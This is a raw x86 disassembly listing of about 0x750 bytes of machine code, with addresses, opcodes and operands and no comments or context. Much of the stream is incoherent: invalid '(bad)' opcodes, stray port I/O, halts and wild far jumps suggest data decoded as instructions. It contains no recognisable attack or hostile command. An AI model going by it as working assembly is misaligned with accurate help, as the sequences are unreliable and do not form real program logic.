  43c948:	mov    al,BYTE PTR [ebx]
  43c94a:	hlt    
  43c94b:	mov    dh,0xc2
  43c94d:	in     eax,0xe6
  43c94f:	jbe    0x43c9b5
  43c951:	fidivr DWORD PTR [eax]
  43c953:	lock lods eax,DWORD PTR ds:[esi]
  43c955:	in     eax,0x65
  43c957:	js     0x43c8e0
  43c959:	add    ebx,DWORD PTR [esp+ebp*2-0x10e98e0]
  43c960:	sbb    al,0x61
  43c962:	jb     0xc23daef2
  43c968:	dec    edi
  43c969:	ret    0xe8ff
  43c96c:	jbe    0x43c970
  43c96e:	jl     0x43c907
  43c970:	jmp    0x7617881c
  43c975:	jge    0x43c935
  43c977:	push   0x56
  43c979:	cli    
  43c97a:	jl     0x43c94f
  43c97c:	jp     0x43c9ef
  43c97e:	add    eax,0x6ce55e6a
  43c983:	sub    esp,DWORD PTR [ecx+0x47]
  43c986:	clc    
  43c987:	mov    esi,0xb37ca640
  43c98c:	jnp    0x43c9ff
  43c98e:	xor    DWORD PTR [edx+0x3e],ebp
  43c991:	out    0x73,eax
  43c993:	out    dx,eax
  43c994:	push   ds
  43c995:	aaa    
  43c996:	clc    
  43c997:	sahf   
  43c998:	and    BYTE PTR [esi+0x907c],ah
  43c99e:	add    BYTE PTR [eax],al
  43c9a0:	add    BYTE PTR [ecx+esi*2+0x2],dh
  43c9a4:	sbb    DWORD PTR [eax-0x16],0x663486f8
  43c9ab:	mul    edi
  43c9ad:	fwait
  43c9ae:	add    al,ch
  43c9b0:	mov    ch,0xfe
  43c9b2:	jmp    0xec3874af
  43c9b7:	add    ah,bl
  43c9b9:	lock fsubr QWORD PTR [esi]
  43c9bc:	popa   
  43c9bd:	loopne 0x43c9a8
  43c9bf:	mov    esp,0x72f9de6a
  43c9c4:	out    0xce,eax
  43c9c6:	and    bh,al
  43c9c8:	inc    esi
  43c9c9:	enter  0xe7a5,0xe0
  43c9cd:	fucomi st,st(1)
  43c9cf:	clc    
  43c9d0:	bound  eax,QWORD PTR [edx-0x6a5c00f4]
  43c9d6:	addr16 inc ebx
  43c9d8:	retf   0xa774
  43c9db:	shl    BYTE PTR [esp+ecx*4+0x76e90002],0x7f
  43c9e3:	inc    edx
  43c9e4:	retf   0xb071
  43c9e7:	aas    
  43c9e8:	add    BYTE PTR [ebp-0x63ff48d5],bl
  43c9ee:	add    BYTE PTR [edi+0x11],dh
  43c9f1:	je     0x43ca20
  43c9f3:	in     eax,dx
  43c9f4:	dec    DWORD PTR [ebx+0x63167581]
  43c9fa:	outs   dx,BYTE PTR ds:[esi]
  43c9fb:	sub    ch,al
  43c9fd:	dec    esp
  43c9fe:	xlat   BYTE PTR ds:[ebx]
  43c9ff:	idiv   edi
  43ca01:	cvtps2pi mm0,xmm0
  43ca04:	add    BYTE PTR [eax],al
  43ca06:	add    BYTE PTR [eax],al
  43ca08:	add    BYTE PTR [eax],al
  43ca0a:	dec    esp
  43ca0b:	add    BYTE PTR [ebp+eiz*1-0x3b],bh
  43ca0f:	sar    DWORD PTR [ecx-0x4686af16],0x83
  43ca16:	sub    eax,0x1afa7aff
  43ca1b:	push   ebp
  43ca1c:	add    eax,DWORD PTR [ebx+0x1173f8d5]
  43ca22:	add    al,0xbf
  43ca24:	out    dx,eax
  43ca25:	dec    DWORD PTR [ebx]
  43ca27:	ret    
  43ca28:	jnp    0x43ca24
  43ca2a:	cmp    edx,DWORD PTR [ebp-0x2]
  43ca2d:	out    0xe0,eax
  43ca2f:	(bad)  
  43ca30:	idiv   edi
  43ca32:	(bad)  
  43ca34:	scas   eax,DWORD PTR es:[edi]
  43ca35:	hlt    
  43ca36:	mov    ebp,esi
  43ca38:	add    DWORD PTR [ebp+0x26],0x1
  43ca3c:	cmp    eax,0x1b245f23
  43ca41:	add    bl,BYTE PTR [edi-0x33e5c25a]
  43ca47:	(bad)  
  43ca48:	(bad)  
  43ca49:	call   DWORD PTR [edi+0x24]
  43ca4c:	sbb    ecx,DWORD PTR [edi]
  43ca4e:	push   edx
  43ca4f:	aas    
  43ca50:	stc    
  43ca51:	cmp    al,0x4b
  43ca53:	(bad)  
  43ca54:	(bad)  
  43ca55:	dec    DWORD PTR [ebx]
  43ca57:	psubsb mm3,mm3
  43ca5a:	sub    dh,0xf7
  43ca5d:	sbb    ecx,0xfffffff5
  43ca60:	add    esi,DWORD PTR [edx+ebx*4-0x7e]
  43ca64:	jne    0x43ca7c
  43ca66:	jne    0x43ca3b
  43ca68:	push   0xa76f608
  43ca6d:	add    DWORD PTR [eax],eax
  43ca6f:	add    BYTE PTR [eax],al
  43ca71:	add    BYTE PTR [eax],al
  43ca73:	adc    dl,bh
  43ca75:	out    0x3e,eax
  43ca77:	popf   
  43ca78:	pop    ecx
  43ca79:	in     al,dx
  43ca7a:	clc    
  43ca7b:	sbb    BYTE PTR [eax],0x32
  43ca7e:	shl    BYTE PTR [ebp-0x27],0xfc
  43ca82:	jnp    0x43ca2d
  43ca84:	jb     0x43ca48
  43ca86:	mov    esi,0xbe7bdd5f
  43ca8b:	idiv   BYTE PTR [ecx-0x3ca08304]
  43ca91:	ja     0x43caa6
  43ca93:	test   cl,0xfb
  43ca96:	jp     0x43ca2d
  43ca98:	pop    eax
  43ca99:	jmp    0x43ca97
  43ca9b:	(bad)  
  43ca9c:	rol    BYTE PTR [ecx+0x162d77f6],1
  43caa2:	call   0xf9304f6f
  43caa7:	ss pop eax
  43caa9:	jmp    0x6df6:0x81e0a808
  43cab0:	cmc    
  43cab1:	add    eax,0xed64b8e8
  43cab6:	clc    
  43cab7:	ss xchg ecx,eax
  43cab9:	sub    esi,esp
  43cabb:	add    ch,BYTE PTR [ecx+edi*2+0x42]
  43cabf:	pop    edi
  43cac0:	fiadd  DWORD PTR [edi+0x1d]
  43cac3:	not    BYTE PTR [ebp+0x1bb7fe21]
  43cac9:	inc    edi
  43caca:	push   ss
  43cacb:	jne    0x43caa6
  43cacd:	cld    
  43cace:	(bad)  
  43cacf:	out    dx,al
  43cad0:	popf   
  43cad1:	and    DWORD PTR [ecx],ecx
  43cad3:	or     ebx,DWORD PTR [ecx+0x3b03]
  43cad9:	add    BYTE PTR [eax],al
  43cadb:	add    BYTE PTR [edx],cl
  43cadd:	frndint 
  43cadf:	inc    DWORD PTR [edx-0x36]
  43cae2:	aam    0x5b
  43cae4:	rcl    DWORD PTR [ebx],0xed
  43cae7:	jl     0x43cb19
  43cae9:	add    bh,cl
  43caeb:	or     ch,BYTE PTR [edi]
  43caed:	and    BYTE PTR [edi],cl
  43caef:	add    esp,DWORD PTR [edx+eiz*8-0x3da038ef]
  43caf6:	out    0x3,al
  43caf8:	jne    0x43cb60
  43cafa:	fdivr  QWORD PTR [eax+ecx*8-0x40]
  43cafe:	or     al,0x8
  43cb00:	cli    
  43cb01:	shl    BYTE PTR [ebp-0x1b],0x6d
  43cb05:	jg     0x43caf3
  43cb07:	add    dh,ah
  43cb09:	or     bh,cl
  43cb0b:	mul    BYTE PTR [edx+eiz*8-0x27]
  43cb0f:	(bad)  
  43cb10:	pop    edx
  43cb11:	jmp    0x8ea1bdeb
  43cb16:	and    ecx,DWORD PTR [esi]
  43cb18:	push   edx
  43cb19:	inc    edi
  43cb1a:	push   es
  43cb1b:	xchg   DWORD PTR [edi+0x35c6e525],esi
  43cb21:	dec    eax
  43cb22:	int    0x3
  43cb24:	jne    0x43cb28
  43cb26:	out    0x7e,eax
  43cb28:	mov    bh,0x25
  43cb2a:	repnz mov ecx,0xb2dc036a
  43cb30:	and    ah,dl
  43cb32:	out    0x72,al
  43cb34:	sub    dl,0xdc
  43cb37:	test   DWORD PTR ds:0x677065e2,0xfbf307
  43cb41:	add    BYTE PTR [eax],al
  43cb43:	add    BYTE PTR [eax],al
  43cb45:	sbb    DWORD PTR [edi-0x27],0x7e047c0a
  43cb4c:	xor    eax,0xf25897dd
  43cb51:	in     eax,dx
  43cb52:	lds    ebx,FWORD PTR [ebx]
  43cb54:	(bad)
  43cb58:	outs   dx,DWORD PTR ds:[esi]
  43cb59:	xchg   esi,eax
  43cb5a:	mov    esp,DWORD PTR [esp+eax*8]
  43cb5d:	fadd   DWORD PTR [esi]
  43cb5f:	jo     0x43cb25
  43cb61:	dec    ecx
  43cb62:	jecxz  0x43cb4d
  43cb64:	xchg   al,cl
  43cb66:	push   cs
  43cb67:	add    BYTE PTR [ebx+edi*4+0x22e1f75e],bh
  43cb6e:	adc    eax,ebp
  43cb70:	jge    0x43cb1e
  43cb72:	(bad)  
  43cb74:	sub    bh,bl
  43cb76:	xlat   BYTE PTR ds:[ebx]
  43cb77:	or     BYTE PTR [esp+ebp*2-0x78e87916],bl
  43cb7e:	fidivr DWORD PTR [ecx+edx*1-0x10710e6]
  43cb85:	add    BYTE PTR [esi+edx*1-0x18],al
  43cb89:	sub    eax,0x9ba47cff
  43cb8e:	loopne 0x43cb4d
  43cb90:	scas   al,BYTE PTR es:[edi]
  43cb91:	mov    dl,0xf8
  43cb93:	(bad)  
  43cb94:	call   0x2cc8ce0f
  43cb99:	nop
  43cb9a:	or     esi,DWORD PTR [edx-0x46e289d7]
  43cba0:	jmp    0xd8bcce1b
  43cba5:	push   ds
  43cba6:	sub    esp,0xb6
  43cbac:	add    BYTE PTR [eax],al
  43cbae:	inc    esp
  43cbaf:	pop    esi
  43cbb0:	jnp    0x43cb89
  43cbb2:	jge    0x43cc10
  43cbb4:	and    DWORD PTR [ecx-0x61072b40],edx
  43cbba:	cmp    BYTE PTR [eax+eax*8],bl
  43cbbd:	jmp    0xf3bfce38
  43cbc2:	(bad)  
  43cbc3:	lahf   
  43cbc4:	mov    esi,0xbe897d93
  43cbc9:	push   0x16
  43cbcb:	or     bh,BYTE PTR [ebp+0x73]
  43cbce:	cli    
  43cbcf:	push   ebx
  43cbd0:	add    eax,0x7407de6a
  43cbd5:	out    dx,eax
  43cbd6:	into   
  43cbd7:	cs repnz pop esi
  43cbda:	in     al,0x9d
  43cbdc:	out    0xc,eax
  43cbde:	loopne 0x43cbb9
  43cbe0:	clc    
  43cbe1:	bound  edi,QWORD PTR [edx]
  43cbe3:	clc    
  43cbe4:	(bad)  
  43cbe5:	call   FWORD PTR [ecx]
  43cbe7:	es jnp 0x43cc2f
  43cbea:	outs   dx,DWORD PTR ds:[esi]
  43cbeb:	or     BYTE PTR [ebx+0xf09c7],bh
  43cbf1:	add    BYTE PTR [esp+eax*1+0x1bf4583],bl
  43cbf8:	scas   al,BYTE PTR es:[edi]
  43cbf9:	inc    eax
  43cbfa:	lea    ebp,[edi]
  43cbfc:	mov    bh,0x0
  43cbfe:	mov    WORD PTR [edi+esi*2],es
  43cc01:	adc    DWORD PTR [ebp+ebx*1-0x15],esi
  43cc05:	push   DWORD PTR [ebx-0x79]
  43cc08:	jne    0x43cc20
  43cc0a:	fwait
  43cc0b:	push   edx
  43cc0c:	dec    edx
  43cc0d:	call   0x3ba392
  43cc12:	add    BYTE PTR [eax],al
  43cc14:	add    BYTE PTR [eax],al
  43cc16:	add    BYTE PTR [edi+0x5c00c02f],bl
  43cc1c:	add    al,0x7c
  43cc1e:	inc    ebp
  43cc1f:	in     eax,0xc5
  43cc21:	mov    ecx,0xba5d48ea
  43cc26:	cmp    DWORD PTR ds:0x40fa7b03,0x59
  43cc2d:	(bad)  
  43cc2e:	out    0x2c,eax
  43cc30:	fincstp 
  43cc32:	dec    DWORD PTR [edi]
  43cc34:	xchg   edx,esi
  43cc36:	or     eax,0xd5e80c69
  43cc3b:	or     ebx,edx
  43cc3d:	test   ebx,0x7506ed8f
  43cc43:	sbb    al,0x87
  43cc45:	icebp  
  43cc46:	add    BYTE PTR [eax+0xd],ch
  43cc49:	jnp    0x43cc44
  43cc4b:	add    al,0x71
  43cc4d:	push   cs
  43cc4e:	call   0x3ba51f
  43cc53:	iret   
  43cc54:	xchg   dl,dh
  43cc56:	psubsw mm3,mm6
  43cc59:	jnp    0x43cc54
  43cc5b:	in     al,0x6f
  43cc5d:	(bad)  
  43cc5e:	out    0xfc,eax
  43cc60:	fdiv   st,st(7)
  43cc62:	push   DWORD PTR [ebp+0x2c]
  43cc65:	aad    0x9c
  43cc67:	(bad)  
  43cc68:	push   eax
  43cc69:	lock test BYTE PTR [eax],dh
  43cc6c:	jecxz  0x43cc6b
  43cc6e:	inc    edx
  43cc6f:	xchg   esi,eax
  43cc70:	ins    BYTE PTR es:[edi],dx
  43cc71:	inc    edx
  43cc72:	sbb    eax,0xcbb92c77
  43cc77:	rol    DWORD PTR [ecx],0x98
  43cc7a:	cld    
  43cc7b:	add    BYTE PTR [eax],al
  43cc7d:	add    BYTE PTR [eax],al
  43cc7f:	add    BYTE PTR [edx+0x75fffce9],ch
  43cc85:	jmp    0x65b9cc86
  43cc8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cc8b:	cld    
  43cc8c:	xchg   edx,eax
  43cc8d:	cmc    
  43cc8e:	or     al,0x0
  43cc90:	jne    0x43cc97
  43cc92:	xchg   edi,eax
  43cc93:	cld    
  43cc94:	sub    cl,0xfc
  43cc97:	push   DWORD PTR [ebp-0x17]
  43cc9a:	cld    
  43cc9b:	push   DWORD PTR [ebp+0x7b]
  43cc9e:	call   0x7500:0xc916afc
  43cca5:	cmc    
  43cca6:	mov    esp,?
  43cca8:	pop    edx
  43cca9:	jmp    0xe9b9ccaa
  43ccae:	cld    
  43ccaf:	push   DWORD PTR [ebp+0x29]
  43ccb2:	lahf   
  43ccb3:	cld    
  43ccb4:	inc    edx
  43ccb5:	jmp    0x3db8ccc6
  43ccba:	xchg   edx,eax
  43ccbb:	cld    
  43ccbc:	xor    ch,cl
  43ccbe:	cld    
  43ccbf:	push   DWORD PTR [ebp-0x17]
  43ccc2:	cld    
  43ccc3:	push   DWORD PTR [ebp-0x67]
  43ccc6:	cdq    
  43ccc7:	cld    
  43ccc8:	sbb    cl,BYTE PTR [ecx]
  43ccca:	or     eax,0x92657500
  43cccf:	cld    
  43ccd0:	or     ch,cl
  43ccd2:	cld    
  43ccd3:	push   DWORD PTR [ebp-0x17]
  43ccd6:	cld    
  43ccd7:	push   DWORD PTR [ebp-0x41]
  43ccda:	cdq    
  43ccdb:	cld    
  43ccdc:	repnz clc 
  43ccde:	or     al,0x0
  43cce0:	jne    0x43cce4
  43cce2:	pop    ebx
  43cce3:	xchg   esi,eax
  43cce4:	add    BYTE PTR [eax],al
  43cce6:	add    BYTE PTR [eax],al
  43cce8:	add    cl,ah
  43ccea:	fsubrp st(6),st
  43ccec:	add    esi,DWORD PTR [ebp+0x2]
  43ccef:	out    0x3,eax
  43ccf1:	jne    0x43ccf5
  43ccf3:	adc    ebx,DWORD PTR [edi+0x1326dec9]
  43ccf9:	jne    0x43ccfd
  43ccfb:	mov    ecx,DWORD PTR [ebp+0x3e6deb9]
  43cd01:	jne    0x43cd05
  43cd03:	out    0x3,eax
  43cd05:	jne    0x43cd09
  43cd07:	pop    ss
  43cd08:	lahf   
  43cd09:	mov    eax,ds:0x75159ede
  43cd0e:	add    al,BYTE PTR [edi]
  43cd10:	xchg   ebx,eax
  43cd11:	xchg   ecx,eax
  43cd12:	fsubrp st(6),st
  43cd14:	add    esi,DWORD PTR [ebp+0x2]
  43cd17:	out    0x3,eax
  43cd19:	jne    0x43cd1d
  43cd1b:	pop    es
  43cd1c:	mov    ah,0x79
  43cd1e:	fiadd  WORD PTR [edx+0x14]
  43cd21:	jne    0x43cd25
  43cd23:	test   DWORD PTR [ebx+0x3e6de69],0x3e70275
  43cd2d:	jne    0x43cd31
  43cd2f:	pop    ebp
  43cd30:	mov    ah,0x51
  43cd32:	fimul  WORD PTR [edx-0x7cfd8ae8]
  43cd38:	xchg   edx,eax
  43cd39:	inc    ecx
  43cd3a:	fsubrp st(6),st
  43cd3c:	add    esi,DWORD PTR [ebp+0x2]
  43cd3f:	out    0x3,eax
  43cd41:	jne    0x43cd45
  43cd43:	inc    ecx
  43cd44:	mov    dl,0x29
  43cd46:	fisubr WORD PTR [esi+0x13]
  43cd49:	jne    0x43cd4d
  43cd4b:	jae    0x43ccd8
  43cd4d:	add    BYTE PTR [eax],al
  43cd4f:	add    BYTE PTR [eax],al
  43cd51:	add    BYTE PTR [ecx],bl
  43cd53:	fsubrp st(6),st
  43cd55:	add    esi,DWORD PTR [ebp+0x2]
  43cd58:	out    0x3,eax
  43cd5a:	jne    0x43cd5e
  43cd5c:	or     DWORD PTR [eax+0x1906de01],edi
  43cd62:	jne    0x43cd66
  43cd64:	add    cl,bh
  43cd66:	or     bh,bl
  43cd68:	clc    
  43cd69:	jmp    0xe943cfe4
  43cd6e:	jbe    0x43cd72
  43cd70:	add    bl,bl
  43cd72:	and    bl,bh
  43cd74:	clc    
  43cd75:	adc    eax,0xc9000266
  43cd7a:	loopne 0x43cd5a
  43cd7c:	clc    
  43cd7d:	jmp    0xe943cff8
  43cd82:	jbe    0x43cd86
  43cd84:	add    BYTE PTR [ebp-0x16],bh
  43cd87:	fdivp  st(0),st
  43cd89:	std    
  43cd8a:	xchg   DWORD PTR [edx],eax
  43cd8c:	add    cl,cl
  43cd8e:	or     bl,bh
  43cd90:	clc    
  43cd91:	jmp    0xe943d00c
  43cd96:	jbe    0x43cd9a
  43cd98:	add    BYTE PTR [ebx],dh
  43cd9a:	ret    0xf8de
  43cd9d:	adc    eax,0x8d000266
  43cda2:	jmp    0x772dc685
  43cda7:	add    al,BYTE PTR [eax]
  43cda9:	jmp    0x6143d024
  43cdae:	sub    bl,dh
  43cdb0:	clc    
  43cdb1:	and    DWORD PTR [ebx+0xe90002],eax
  43cdb7:	add    BYTE PTR [eax],al
  43cdb9:	add    BYTE PTR [eax],al
  43cdbb:	jbe    0x43cdbf
  43cdbd:	add    cl,ch
  43cdbf:	jbe    0x43cdc3
  43cdc1:	add    cl,ch
  43cdc3:	jbe    0x43cdc7
  43cdc5:	add    cl,ch
  43cdc7:	jbe    0x43cdcb
  43cdc9:	add    cl,ch
  43cdcb:	jbe    0x43cdcf
  43cdcd:	add    BYTE PTR [edi],bh
  43cdcf:	pmaxub mm7,mm0
  43cdd2:	outs   dx,DWORD PTR ds:[esi]
  43cdd3:	(bad)  
  43cdd4:	(bad)  
  43cdd6:	cmp    edi,0xffffffdd
  43cdd9:	clc    
  43cdda:	inc    ebp
  43cddb:	out    dx,eax
  43cddc:	(bad)  
  43cdde:	dec    edi
  43cddf:	out    dx,eax
  43cde0:	(bad)  
  43cde2:	add    dh,bl
  43cde4:	ja     0x43cde1
  43cde6:	push   eax
  43cde8:	ja     0x43cde5
  43cdea:	jmp    FWORD PTR [edx+0x78]
  43cded:	sti    
  43cdee:	dec    esp
  43cdf0:	jns    0x43cded
  43cdf2:	push   DWORD PTR [eax+0x7b]
  43cdf5:	sti    
  43cdf6:	inc    DWORD PTR [eax+0x1efffb7b]
  43cdfc:	jp     0x43cdf9
  43cdfe:	inc    DWORD PTR [eax]
  43ce00:	jp     0x43cdfd
  43ce02:	jmp    DWORD PTR [ecx+edi*2+0x79fafffb]
  43ce09:	sti    
  43ce0a:	dec    DWORD PTR [ebx+edi*2-0x5]
  43ce0e:	push   esi
  43ce10:	jp     0x43ce0d
  43ce12:	dec    DWORD PTR [ebx+edi*2-0x5]
  43ce16:	push   DWORD PTR [ebx+edi*2]
  43ce19:	sti    
  43ce1a:	jmp    FWORD PTR [ebx+edi*2-0x5]
  43ce1e:	inc    DWORD PTR [eax]
  43ce20:	add    BYTE PTR [eax],al
  43ce22:	add    BYTE PTR [eax],al
  43ce24:	xchg   esp,eax
  43ce25:	jl     0x43ce22
  43ce27:	jmp    DWORD PTR [esp+edi*2+0x7cd0fffb]
  43ce2e:	sti    
  43ce2f:	(bad)  
  43ce30:	call   0xc543c9b0
  43ce35:	mov    ds:0x7c00fffb,al
  43ce3a:	sti    
  43ce3b:	call   FWORD PTR [esp+edi*2]
  43ce3e:	sti    
  43ce3f:	dec    DWORD PTR [eax]
  43ce41:	jl     0x43ce3e
  43ce43:	jmp    FWORD PTR [esp+edi*2]
  43ce46:	sti    
  43ce47:	inc    DWORD PTR [ebp+edi*2-0x5]
  43ce4b:	call   FWORD PTR [edx]
  43ce4d:	jge    0x43ce4a
  43ce4f:	jmp    FWORD PTR [edi*2+0x787afffb]
  43ce56:	sti    
  43ce57:	dec    DWORD PTR [eax+eax*1]
  43ce5a:	add    BYTE PTR [eax],al
  43ce5c:	sub    BYTE PTR [edx-0x1c8a0005],dl
  43ce62:	scas   al,BYTE PTR es:[edi]
  43ce63:	cld    
  43ce64:	or     cl,BYTE PTR [esi-0x71fd0353]
  43ce6a:	lods   eax,DWORD PTR ds:[esi]
  43ce6b:	cld    
  43ce6c:	cli    
  43ce6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ce6e:	lods   eax,DWORD PTR ds:[esi]
  43ce6f:	cld    
  43ce70:	repnz inc ebp
  43ce72:	scas   al,BYTE PTR es:[edi]
  43ce73:	cld    
  43ce74:	jmp    0xae93:0xe2fcae33
  43ce7b:	cld    
  43ce7c:	fucompp 
  43ce7e:	cld    
  43ce7f:	push   DWORD PTR [ebp+0x29]
  43ce82:	lods   eax,DWORD PTR ds:[esi]
  43ce83:	cld    
  43ce84:	retf   0xac93
  43ce87:	cld    
  43ce88:	add    BYTE PTR [eax],al
  43ce8a:	add    BYTE PTR [eax],al
  43ce8c:	add    dl,al
  43ce8e:	push   edi
  43ce8f:	lods   eax,DWORD PTR ds:[esi]
  43ce90:	cld    
  43ce91:	mov    edx,0xb2fcac8f
  43ce96:	iret   
  43ce97:	lods   al,BYTE PTR ds:[esi]
  43ce98:	cld    
  43ce99:	stos   BYTE PTR es:[edi],al
  43ce9a:	sub    DWORD PTR [esp+edi*8-0x3537a5e],0xfcad519a
  43cea5:	xchg   edx,eax
  43cea6:	jne    0x43ce54
  43cea8:	cld    
  43cea9:	mov    dh,BYTE PTR [edi-0x54]
  43ceac:	cld    
  43cead:	or     BYTE PTR [ebx-0x50850354],0xac
  43ceb4:	cld    
  43ceb5:	jb     0x43cedc
  43ceb7:	lods   eax,DWORD PTR ds:[esi]
  43ceb8:	cld    
  43ceb9:	push   0xffffffcf
  43cebb:	xchg   esp,eax
  43cebc:	cld    
  43cebd:	(bad)  
  43cebe:	(bad)  [esp+edi*8-0x316a6]
  43cec5:	jne    0x43ce6e
  43cec7:	scas   eax,DWORD PTR es:[edi]
  43cec8:	cld    
  43cec9:	dec    edx
  43ceca:	jmp    0x8db9cecb
  43cecf:	test   esp,edi
  43ced1:	cmp    bl,BYTE PTR [ecx-0x7a]
  43ced4:	cld    
  43ced5:	xor    ch,BYTE PTR [ebx+0x732afc85]
  43cedb:	test   esp,edi
  43cedd:	and    al,BYTE PTR [edx]
  43cedf:	xchg   ebx,eax
  43cee0:	mov    bl,BYTE PTR [ecx]
  43cee2:	fistp  DWORD PTR [esi-0x1b24ee76]
  43cee8:	mov    cl,BYTE PTR [ecx]
  43ceea:	fcomi  st,st(0)
  43ceec:	mov    al,BYTE PTR [ecx]
  43ceee:	fcmovne st,st(2)
  43cef0:	mov    al,BYTE PTR [eax]
  43cef2:	add    BYTE PTR [eax],al
  43cef4:	add    BYTE PTR [eax],al
  43cef6:	stc    
  43cef7:	fidiv  DWORD PTR [eax+0x2adaf18a]
  43cefd:	mov    ebp,ecx
  43ceff:	ficom  DWORD PTR [edx]
  43cf01:	mov    esp,ecx
  43cf03:	fcmove st,st(6)
  43cf05:	mov    bl,cl
  43cf07:	fcmovu st,st(6)
  43cf09:	mov    dl,cl
  43cf0b:	fisubr DWORD PTR [edx-0x75]
  43cf0e:	leave  
  43cf0f:	fidiv  DWORD PTR [esi-0x75]
  43cf12:	rcr    edx,0x60
  43cf15:	mov    edi,DWORD PTR [ecx-0x4e748d26]
  43cf1b:	ficom  DWORD PTR [esi]
  43cf1d:	mov    ebp,DWORD PTR [ecx-0x5e74f526]
  43cf23:	ficom  DWORD PTR [eax]
  43cf25:	mov    ebx,DWORD PTR [ecx-0x6e5c1b26]
  43cf2b:	(bad)  
  43cf2d:	mov    ds:0xa3beda89,eax
  43cf32:	sbb    edx,0xda79a3a4
  43cf38:	xchg   esp,eax
  43cf39:	mov    ds:0xa384da71,eax
  43cf3e:	imul   ebx,edx,0xda61a374
  43cf44:	outs   dx,BYTE PTR ds:[esi]
  43cf45:	mov    ds:0xa37cda59,eax
  43cf4a:	push   ecx
  43cf4b:	fiadd  DWORD PTR [eax-0x7525b65d]
  43cf51:	mov    ds:0xa3aeda41,eax
  43cf56:	cmp    edx,ebx
  43cf58:	sahf   
  43cf59:	mov    ds:0x0,eax
  43cf5e:	add    BYTE PTR [ecx],dh
  43cf60:	(bad)  
  43cf62:	rcl    dh,0xd6
  43cf65:	clc    
  43cf66:	mov    cl,0xd6
  43cf68:	(bad)  
  43cf69:	clc    
  43cf6a:	in     eax,dx
  43cf6b:	rcl    esi,1
  43cf6d:	clc    
  43cf6e:	add    eax,ebx
  43cf70:	(bad)  
  43cf71:	clc    
  43cf72:	jnp    0x43cf70
  43cf74:	(bad)  
  43cf75:	clc    
  43cf76:	and    ebx,eax
  43cf78:	(bad)  
  43cf79:	clc    
  43cf7a:	and    eax,edx
  43cf7c:	(bad)  
  43cf7d:	clc    
  43cf7e:	pop    es
  43cf7f:	sbb    bh,dl
  43cf81:	clc    
  43cf82:	repz adc edi,edx
  43cf85:	clc    
  43cf86:	pop    ebx
  43cf87:	sbb    edi,edx
  43cf89:	clc    
  43cf8a:	xchg   ebp,eax
  43cf8b:	adc    edi,edx
  43cf8d:	clc    
  43cf8e:	popf   
  43cf8f:	sbb    edi,edx
  43cf91:	clc    
  43cf92:	and    eax,0x59f8d711
  43cf97:	sbb    edi,edx
  43cf99:	clc    
  43cf9a:	repz adc bh,dl
  43cf9d:	clc    
  43cf9e:	adc    ebx,ebx
  43cfa0:	(bad)  
  43cfa1:	clc    
  43cfa2:	stos   DWORD PTR es:[edi],eax
  43cfa3:	rcl    dh,1
  43cfa5:	clc    
  43cfa6:	xchg   ebx,eax
  43cfa7:	fcom   st(6)
  43cfa9:	clc    
  43cfaa:	fwait
  43cfab:	rcl    dh,1
  43cfad:	clc    
  43cfae:	jae    0x43cf88
  43cfb0:	(bad)  
  43cfb1:	clc    
  43cfb2:	jg     0x43cf84
  43cfb4:	(bad)  
  43cfb5:	clc    
  43cfb6:	pop    ecx
  43cfb7:	fcom   st(6)
  43cfb9:	clc    
  43cfba:	sub    eax,0x21f8d6d0
  43cfbf:	sbb    dh,dl
  43cfc1:	clc    
  43cfc2:	add    DWORD PTR [eax],eax
  43cfc4:	add    BYTE PTR [eax],al
  43cfc6:	add    BYTE PTR [eax],al
  43cfc8:	adc    dh,dl
  43cfca:	clc    
  43cfcb:	jmp    0x43cfe8
  43cfcd:	(bad)  
  43cfce:	clc    
  43cfcf:	stc    
  43cfd0:	adc    esi,edx
  43cfd2:	clc    
  43cfd3:	or     DWORD PTR [eax],ebx
  43cfd5:	(bad)  
  43cfd6:	clc    
  43cfd7:	sbb    DWORD PTR [eax],edx
  43cfd9:	(bad)  
  43cfda:	clc    
  43cfdb:	and    eax,0xf8d618
  43cfe0:	pop    esi
  43cfe1:	lahf   
  43cfe2:	sti    
  43cfe3:	(bad)  
  43cfe4:	mov    esp,0xb2fffb9f
  43cfe9:	lahf   
  43cfea:	sti    
  43cfeb:	push   DWORD PTR [ecx+ebp*4]
  43cfee:	sti    
  43cfef:	jmp    eax
  43cff1:	test   al,0xfb
  43cff3:	call   DWORD PTR [ecx+ebp*4-0x564f0005]
  43cffa:	sti    
  43cffb:	dec    DWORD PTR [edx-0x77000457]
  43d001:	test   eax,0x8c86fffb
  43d006:	sti    
  43d007:	call   FWORD PTR [esi-0x74]
  43d00a:	sti    
  43d00b:	dec    DWORD PTR [eax-0x6b000474]
  43d011:	mov    ebx,?
  43d013:	(bad)  
  43d014:	jl     0x43cfa2
  43d016:	sti    
  43d017:	dec    eax
  43d019:	mov    bh,bl
  43d01b:	push   DWORD PTR [edx]
  43d01d:	cmp    ebx,0xfb8120ff
  43d023:	call   DWORD PTR [ecx+eax*4-0x5]
  43d027:	jmp    DWORD PTR [esi]
  43d029:	cmp    ebx,0xff
  43d02f:	add    BYTE PTR [eax],al
  43d031:	test   BYTE PTR [eax-0x7ee70005],0xfb
  43d038:	call   FWORD PTR [esi]
  43d03a:	cmp    ebx,0xfb7ff0ff
  43d040:	call   eax
  43d042:	jg     0x43d03f
  43d044:	inc    esi
  43d046:	jg     0x43d043
  43d048:	push   DWORD PTR [esi]
  43d04a:	cmp    ebx,0xfb8130ff
  43d050:	inc    DWORD PTR [ecx+eax*4-0x5]
  43d054:	dec    DWORD PTR [eax-0x7f]
  43d057:	sti    
  43d058:	inc    DWORD PTR [eax-0x80]
  43d05b:	sti    
  43d05c:	push   DWORD PTR [ebp-0x6f]
  43d05f:	cmp    ah,0x42
  43d062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d063:	cmp    ah,0x3a
  43d066:	add    BYTE PTR [eax-0x7f73cd04],0xfc
  43d06d:	sub    bh,BYTE PTR [eax]
  43d06f:	cmp    esp,0xfc816422
  43d075:	sbb    ah,BYTE PTR [eax+ecx*4]
  43d078:	cld    
  43d079:	adc    cl,BYTE PTR [eax+ecx*4]
  43d07c:	cld    
  43d07d:	or     bl,BYTE PTR [eax]
  43d07f:	mov    ah,bh
  43d081:	add    ah,BYTE PTR [eax+ecx*4]
  43d084:	cld    
  43d085:	cli    
  43d086:	mov    cl,0x9d
  43d088:	cld    
  43d089:	repnz lea eax,[eax-0x7f3a1504]
  43d090:	cld    
  43d091:	loop   0x43d042
  43d093:	cmp    ah,0x0
  43d096:	add    BYTE PTR [eax],al
  43d098:	add    BYTE PTR [eax],al
